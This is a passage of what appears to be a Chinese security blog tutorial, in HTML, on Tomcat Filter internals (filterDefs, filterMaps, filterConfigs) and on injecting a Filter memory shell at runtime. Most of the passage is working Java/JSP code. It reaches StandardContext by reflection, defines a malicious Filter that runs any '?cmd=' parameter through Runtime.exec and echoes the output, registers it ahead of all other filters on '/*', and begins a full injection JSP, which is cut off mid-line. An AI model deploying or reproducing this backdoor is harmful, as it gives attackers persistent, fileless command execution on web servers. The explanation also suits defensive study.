+<td>必须和 <code>&lt;filter&gt;</code> 里的 <code>&lt;filter-name&gt;</code> <strong>完全一致</strong>，Tomcat 靠这个名字把定义和映射绑定在一起</td>
+</tr>
+<tr>
+<td><code>&lt;url-pattern&gt;</code></td>
+<td>指定拦截的 URL 模式</td>
+<td><code>/*</code> 表示拦截<strong>所有</strong>请求；<code>/admin/*</code> 表示只拦截 &#x2F;admin&#x2F; 开头的请求；<code>*.jsp</code> 表示拦截所有 .jsp 结尾的请求</td>
+</tr>
+</tbody></table>
+<p>此时把代码注释后，仍然可以以相同的方式触发 Filter（因为 web.xml 里已经配好了）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Filter_image10.png"></p>
+<hr>
+<h3 id="两种静态注册方式对比"><a href="#两种静态注册方式对比" class="headerlink" title="两种静态注册方式对比"></a>两种静态注册方式对比</h3><table>
+<thead>
+<tr>
+<th>注册方式</th>
+<th>写法</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>注解式</strong></td>
+<td><code>@WebFilter(&quot;/*&quot;)</code></td>
+<td>代码即配置，简单直观，Servlet 3.0 引入</td>
+</tr>
+<tr>
+<td><strong>web.xml 式</strong></td>
+<td>在 WEB-INF&#x2F;web.xml 中用 XML 声明</td>
+<td>配置集中，无需修改代码即可调整拦截规则</td>
+</tr>
+</tbody></table>
+<p>两种方式的效果<strong>完全一样</strong>，都是让 Tomcat 在启动时把 Filter 注册到 StandardContext 里。</p>
+<p>不过以上都是<strong>静态注册</strong>，也就是在启动前就写死在代码里的。接下来才是重点——动态注入。</p>
+<hr>
+<h2 id="三、StandardContext-中的三个核心-Filter-集合"><a href="#三、StandardContext-中的三个核心-Filter-集合" class="headerlink" title="三、StandardContext 中的三个核心 Filter 集合"></a>三、StandardContext 中的三个核心 Filter 集合</h2><p>在讲动态注入之前，需要先搞清楚 StandardContext 内部的结构。</p>
+<p>StandardContext 作为 Web 应用的容器总管，内部维护了三个直接决定 Filter 如何工作的关键成员变量：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> HashMap&lt;String, FilterDef&gt; filterDefs = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();          <span class="comment">// 1. 定义集合</span></span><br><span class="line"><span class="keyword">private</span> FilterMap[] filterMaps = <span class="keyword">new</span> <span class="title class_">FilterMap</span>[<span class="number">0</span>];                         <span class="comment">// 2. 路由数组</span></span><br><span class="line"><span class="keyword">private</span> HashMap&lt;String, ApplicationFilterConfig&gt; filterConfigs = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  <span class="comment">// 3. 运行时配置集合</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-filterDefs-——-Filter-定义库"><a href="#1-filterDefs-——-Filter-定义库" class="headerlink" title="1. filterDefs —— Filter 定义库"></a>1. filterDefs —— Filter 定义库</h3><ul>
+<li><strong>类型</strong>：<code>HashMap&lt;String, FilterDef&gt;</code></li>
+<li><strong>存储内容</strong>：以 Filter 的内部名称（如 <code>&quot;logFilter&quot;</code>）为键，以对应的 FilterDef 对象为值。</li>
+<li><strong>作用</strong>：保存应用中所有已声明的 Filter 的<strong>元数据定义</strong>，包括名字、类名、实例引用等。</li>
+<li><strong>何时填充</strong>：Tomcat <strong>启动阶段</strong>解析 web.xml 或扫描 @WebFilter 注解时，每发现一个 Filter 就创建一个 FilterDef 并存入此 Map。</li>
+</ul>
+<h3 id="2-filterMaps-——-Filter-路由表"><a href="#2-filterMaps-——-Filter-路由表" class="headerlink" title="2. filterMaps —— Filter 路由表"></a>2. filterMaps —— Filter 路由表</h3><ul>
+<li><strong>类型</strong>：<code>FilterMap[]</code></li>
+<li><strong>存储内容</strong>：数组中的每个 FilterMap 对象描述了一个 Filter 与 URL 模式（或 Servlet 名称）的映射关系。</li>
+<li><strong>作用</strong>：决定<strong>哪些请求路径需要经过哪些 Filter</strong>，以及多个 Filter 之间的执行顺序。</li>
+<li><strong>何时填充</strong>：同样在<strong>启动阶段</strong>解析 <code>&lt;filter-mapping&gt;</code> 或注解的 urlPatterns 属性时构建并加入数组。</li>
+</ul>
+<h3 id="3-filterConfigs-——-运行时配置缓存"><a href="#3-filterConfigs-——-运行时配置缓存" class="headerlink" title="3. filterConfigs —— 运行时配置缓存"></a>3. filterConfigs —— 运行时配置缓存</h3><ul>
+<li><strong>类型</strong>：<code>HashMap&lt;String, ApplicationFilterConfig&gt;</code></li>
+<li><strong>存储内容</strong>：以 Filter 名称为键，以 ApplicationFilterConfig 对象为值。</li>
+<li><strong>作用</strong>：缓存 Filter 的<strong>运行时完整配置</strong>。ApplicationFilterConfig 内部封装了 FilterDef 和 Filter 实例，Tomcat 在执行过滤链时，会从此处取出对应的 ApplicationFilterConfig，再通过它拿到 Filter 实例并调用 doFilter 方法。</li>
+<li><strong>何时填充</strong>：<strong>懒加载</strong>。并非启动时立即填充，而是在<strong>某个 Filter 第一次被请求匹配到时</strong>，Tomcat 才会根据 filterDefs 中的定义创建对应的 ApplicationFilterConfig 对象，并放入 filterConfigs 缓存起来，后续请求直接复用。</li>
+</ul>
+<hr>
+<h3 id="三者的协作流程"><a href="#三者的协作流程" class="headerlink" title="三者的协作流程"></a>三者的协作流程</h3><ol>
+<li><strong>请求到达</strong> → Tomcat 遍历 filterMaps，找出所有匹配当前 URL 的 Filter 名称。</li>
+<li>对每个名称，去 filterConfigs 中查找是否已有 ApplicationFilterConfig：<ul>
+<li><strong>有</strong> → 直接取出使用。</li>
+<li><strong>无</strong> → 去 filterDefs 中找到对应的 FilterDef，据此创建 ApplicationFilterConfig 对象，存入 filterConfigs，然后使用。</li>
+</ul>
+</li>
+<li>依次调用各 Filter 实例的 doFilter 方法，形成过滤链。</li>
+</ol>
+<hr>
+<h3 id="对内存马的关键意义"><a href="#对内存马的关键意义" class="headerlink" title="对内存马的关键意义"></a>对内存马的关键意义</h3><p>正常 Filter 的 filterDefs 和 filterMaps 在<strong>启动时</strong>由容器自动填充，filterConfigs 则在<strong>首次请求时</strong>按需创建。</p>
+<p>而内存马是在<strong>运行时动态注入</strong>的，此时启动阶段早已结束。如果只添加了 FilterDef 和 FilterMap，当请求匹配到恶意 Filter 时，Tomcat 会尝试懒加载创建 ApplicationFilterConfig，但由于运行时的一些状态检查（例如 <code>context.getState().isAvailable()</code> 等），动态创建可能会失败，最终导致 <code>No filter configuration found</code> 的警告，Filter 无法生效。</p>
+<p><strong>所以内存马必须手动强制把 ApplicationFilterConfig 塞进 filterConfigs</strong>，这就是第五步存在的原因。</p>
+<hr>
+<h2 id="四、动态注册：绕过-web-xml-注入-Filter-内存马"><a href="#四、动态注册：绕过-web-xml-注入-Filter-内存马" class="headerlink" title="四、动态注册：绕过 web.xml 注入 Filter 内存马"></a>四、动态注册：绕过 web.xml 注入 Filter 内存马</h2><p>目标是在运行时完成以下五步：</p>
+<ol>
+<li>拿到当前 Web 应用的 StandardContext 对象。</li>
+<li>手动构造恶意 Filter 的实例。</li>
+<li>将恶意 Filter 的 FilterDef 加入 filterDefs。</li>
+<li>创建 FilterMap 并加入 filterMaps 数组。</li>
+<li><strong>（关键）</strong> 强制构造 ApplicationFilterConfig 并塞入 filterConfigs。</li>
+</ol>
+<hr>
+<h3 id="第一步：拿到-StandardContext（反射挖掘）"><a href="#第一步：拿到-StandardContext（反射挖掘）" class="headerlink" title="第一步：拿到 StandardContext（反射挖掘）"></a>第一步：拿到 StandardContext（反射挖掘）</h3><p>在 JSP 中我们只能拿到 <code>ServletContext</code> 接口，因为 Tomcat 把 StandardContext 锁住了，只留下了 ServletContext 接口。但是我们需要的三个方法是 StandardContext 里的，ServletContext 没有。</p>
+<p>因此必须通过反射，<strong>向下挖两层</strong>，才能拿到 StandardContext 实例。</p>
+<blockquote>
+<p><code>&lt;% %&gt;</code> 是 JSP 中的<strong>脚本段（Scriptlet）</strong>，里面的内容会被当作 <strong>Java 代码</strong>执行。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="comment">// 通过 request（内置对象）获取当前 Web 应用的 ServletContext</span></span><br><span class="line"><span class="comment">// 接口变量 servletContext 的实际类型是 org.apache.catalina.core.ApplicationContextFacade</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 反射获取 ApplicationContextFacade 中的 ApplicationContext</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line"><span class="comment">// 突破限制，强行读取私有字段</span></span><br><span class="line">appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 反射获取 ApplicationContext 中的 StandardContext</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">stdContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdContextField.get(applicationContext);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>层级关系如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">JSP 能拿到的对象：ServletContext 接口</span><br><span class="line">  ↓（实际类型是 ApplicationContextFacade）</span><br><span class="line">  ↓（反射获取其私有字段 &quot;context&quot;）</span><br><span class="line">  ↓</span><br><span class="line">第一层：ApplicationContext 对象</span><br><span class="line">  ↓（反射获取其私有字段 &quot;context&quot;）</span><br><span class="line">  ↓</span><br><span class="line">第二层：StandardContext 对象  ← 目标</span><br></pre></td></tr></table></figure>
+
+<p>由于这些字段都是私有的，必须使用 <code>setAccessible(true)</code> 突破访问限制，<strong>必须两层反射</strong>。</p>
+<hr>
+<h3 id="第二步：定义恶意-Filter（匿名内部类）"><a href="#第二步：定义恶意-Filter（匿名内部类）" class="headerlink" title="第二步：定义恶意 Filter（匿名内部类）"></a>第二步：定义恶意 Filter（匿名内部类）</h3><p>直接在 JSP 中实现 <code>javax.servlet.Filter</code> 接口，创建一个内存中的恶意 Filter 实例。</p>
+<table>
+<thead>
+<tr>
+<th>写法</th>
+<th>代码</th>
+<th>使用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>独立类</strong></td>
+<td><code>public class LogFilter implements Filter &#123; ... &#125;</code></td>
+<td>正规开发，代码需编译成 .class 文件，部署在 WEB-INF&#x2F;classes 中</td>
+</tr>
+<tr>
+<td><strong>匿名内部类</strong></td>
+<td><code>Filter f = new Filter() &#123; ... &#125;;</code></td>
+<td>运行时动态生成，<strong>无需单独文件</strong>，直接在内存中创建实例</td>
+</tr>
+</tbody></table>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="comment">// 匿名内部类</span></span><br><span class="line"><span class="type">Filter</span> <span class="variable">maliciousFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// 必须实现的方法，但内存马不需要初始化操作，所以留空</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// 这是 Filter 的核心拦截方法，每次请求匹配到该 Filter 时被 Tomcat 调用</span></span><br><span class="line">    <span class="comment">// 参数 request、response、chain 由 Tomcat 传入，固定不变</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="comment">// 获取 URL 中 ?cmd=xxx 的参数值，如果没有该参数，返回 null</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 调用操作系统的命令行执行器，执行传入的 cmd 字符串</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取命令执行结果的输出流（Java 8 写法）</span></span><br><span class="line">            <span class="comment">// Java 9+ 写法：byte[] bytes = process.getInputStream().readAllBytes();</span></span><br><span class="line">            java.io.<span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将结果写回浏览器</span></span><br><span class="line">            <span class="comment">// Windows 下中文回显乱码问题通过 new String(bytes, &quot;GBK&quot;) 解决</span></span><br><span class="line">            response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">            <span class="comment">// 执行完命令回显后，直接 return，没有调用 chain.doFilter</span></span><br><span class="line">            <span class="comment">// 请求链在这里被截断，后续的任何 Filter 和目标 Servlet/JSP 都不会执行</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果 cmd == null（没有后门参数），则执行这一行，保证正常业务不受影响</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// 必须实现的清理方法，内存马不需要释放资源，留空</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>总结</strong>：</p>
+<ul>
+<li>使用匿名内部类快速实现 Filter 接口，无需单独编写 .java 文件。</li>
+<li>doFilter 中判断参数 cmd 是否存在，存在则执行系统命令并回显，然后直接 return 截断请求链。</li>
+<li>没有 cmd 参数时正常放行，保证正常业务不受影响。</li>
+<li>Windows 下中文回显乱码问题通过 <code>new String(bytes, &quot;GBK&quot;)</code> 解决。</li>
+</ul>
+<hr>
+<h3 id="第三步：注册-FilterDef（加入档案柜）"><a href="#第三步：注册-FilterDef（加入档案柜）" class="headerlink" title="第三步：注册 FilterDef（加入档案柜）"></a>第三步：注册 FilterDef（加入档案柜）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="comment">// 创建一个对象用来放内存马 maliciousFilter 的信息</span></span><br><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line"></span><br><span class="line">filterDef.setFilterName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"><span class="comment">// 取名字，相当于 web.xml 中的 &lt;filter-name&gt;，后面 FilterMap 会用这个名字来关联</span></span><br><span class="line"></span><br><span class="line">filterDef.setFilterClass(maliciousFilter.getClass().getName());</span><br><span class="line"><span class="comment">// 设置 Filter 的全限定类名，对应 web.xml 中的 &lt;filter-class&gt;，不过用的是反射的方法取得</span></span><br><span class="line"></span><br><span class="line">filterDef.setFilter(maliciousFilter);</span><br><span class="line"><span class="comment">// 设置我们写的这个内存马对象</span></span><br><span class="line"></span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br><span class="line"><span class="comment">// 调用 StandardContext 自带的方法，addFilterDef 把这份信息放入 filterDefs 这个 Map 中</span></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>对应关系</strong>（这一步等价于 web.xml 中的 <code>&lt;filter&gt;</code> 声明）：</p>
+<table>
+<thead>
+<tr>
+<th>正常注册（web.xml）</th>
+<th>内存马动态注册</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;filter-name&gt;evil&lt;/filter-name&gt;</code></td>
+<td><code>filterDef.setFilterName(&quot;evil&quot;)</code></td>
+</tr>
+<tr>
+<td><code>&lt;filter-class&gt;com.example.EvilFilter&lt;/filter-class&gt;</code></td>
+<td><code>filterDef.setFilterClass(...)</code></td>
+</tr>
+<tr>
+<td>Tomcat 根据类名反射创建实例</td>
+<td><code>filterDef.setFilter(maliciousFilter)</code> 直接塞入已有实例</td>
+</tr>
+<tr>
+<td>Tomcat 自动调用 addFilterDef</td>
+<td>我们手动调用 <code>standardContext.addFilterDef(filterDef)</code></td>
+</tr>
+</tbody></table>
+<p>至此，恶意 Filter 的定义已经进入了 StandardContext 的 filterDefs 集合中，但 Tomcat 还不知道这个 Filter 要拦截哪些 URL，也没有准备好运行时配置。接下来的两步会补齐这两个缺口。</p>
+<hr>
+<h3 id="第四步：注册-FilterMap（加入排班表）"><a href="#第四步：注册-FilterMap（加入排班表）" class="headerlink" title="第四步：注册 FilterMap（加入排班表）"></a>第四步：注册 FilterMap（加入排班表）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="comment">// FilterDef、FilterMap 这些都是普通的类，可以正常地直接创建</span></span><br><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line"></span><br><span class="line">filterMap.setFilterName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"><span class="comment">// 名字需要和前面的身份信息一致才能匹配</span></span><br><span class="line"></span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line"><span class="comment">// 设置拦截规则：拦截所有 URL 路径，相当于 web.xml 中的 &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span></span><br><span class="line"></span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"><span class="comment">// 把这个规则添加到 standardContext 里的最前面</span></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>对应 web.xml</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>web.xml 配置</th>
+<th>内存马代码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;filter-mapping&gt;</code></td>
+<td><code>FilterMap filterMap = new FilterMap();</code></td>
+</tr>
+<tr>
+<td><code>&lt;filter-name&gt;evil&lt;/filter-name&gt;</code></td>
+<td><code>filterMap.setFilterName(&quot;evil&quot;);</code></td>
+</tr>
+<tr>
+<td><code>&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</code></td>
+<td><code>filterMap.addURLPattern(&quot;/*&quot;);</code></td>
+</tr>
+<tr>
+<td>（自动按顺序加入）</td>
+<td><code>standardContext.addFilterMapBefore(filterMap);</code></td>
+</tr>
+</tbody></table>
+<p><strong>为什么用 <code>addFilterMapBefore</code> 而不是 <code>addFilterMap</code>？</strong></p>
+<p><code>addFilterMapBefore</code> 会将映射添加到数组<strong>最前面</strong>，确保恶意 Filter 优先执行。内存马选择插在开头是为了<strong>优先拦截请求</strong>，确保无论后面还有哪些合法 Filter，恶意 Filter 都会第一个执行，从而保证 <code>?cmd</code> 参数能被率先捕获。</p>
+<hr>
+<h3 id="第五步（关键）：强制写入-filterConfigs"><a href="#第五步（关键）：强制写入-filterConfigs" class="headerlink" title="第五步（关键）：强制写入 filterConfigs"></a>第五步（关键）：强制写入 filterConfigs</h3><p>由于我们错过了 Tomcat 的启动阶段，必须手动将 ApplicationFilterConfig 塞入 filterConfigs，否则请求到来时会因找不到配置而失效。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="comment">// 反射获取 filterConfigs 字段</span></span><br><span class="line"><span class="comment">// filterConfigs 是 StandardContext 内部的一个 private 字段，没有提供公开的 getter 方法</span></span><br><span class="line"><span class="comment">// 正常情况下，外部代码根本无法访问它，所以必须用反射</span></span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">HashMap&lt;String, ApplicationFilterConfig&gt; filterConfigs = </span><br><span class="line">    (HashMap&lt;String, ApplicationFilterConfig&gt;) filterConfigsField.get(standardContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 ApplicationFilterConfig 对象</span></span><br><span class="line"><span class="comment">// 构造函数需要两个参数：StandardContext 和 FilterDef</span></span><br><span class="line">Constructor&lt;?&gt; constructor = ApplicationFilterConfig.class</span><br><span class="line">    .getDeclaredConstructor(StandardContext.class, FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> </span><br><span class="line">    (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将创建好的 filterConfig 放入 filterConfigs 这个 Map 中</span></span><br><span class="line">filterConfigs.put(<span class="string">&quot;evil&quot;</span>, filterConfig);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>为什么必须手动创建 ApplicationFilterConfig？</strong></p>
+<p>正常流程中，Tomcat 在第一次请求匹配到 Filter 时会自动创建 ApplicationFilterConfig。但内存马注入时，Tomcat 已经启动完毕，处于运行状态。如果只添加了 FilterDef 和 FilterMap，当请求到来时：</p>
+<ol>
+<li>Tomcat 遍历 filterMaps 找到 “evil”</li>
+<li>去 filterConfigs 中查找，发现没有</li>
+<li>尝试根据 filterDefs 创建 ApplicationFilterConfig</li>
+<li><strong>但在创建过程中会检查 context 状态</strong>，可能因为状态不满足条件而失败</li>
+<li>最终导致 Filter 无法生效</li>
+</ol>
+<p>所以必须手动创建并塞入 filterConfigs，绕过 Tomcat 的状态检查。</p>
+<hr>
+<h3 id="完整注入-JSP-与验证"><a href="#完整注入-JSP-与验证" class="headerlink" title="完整注入 JSP 与验证"></a>完整注入 JSP 与验证</h3><p>将以上五步整合成一个完整的 JSP 文件：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="comment">// 第一步：获取 StandardContext</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appContextField.setAccessible(<span 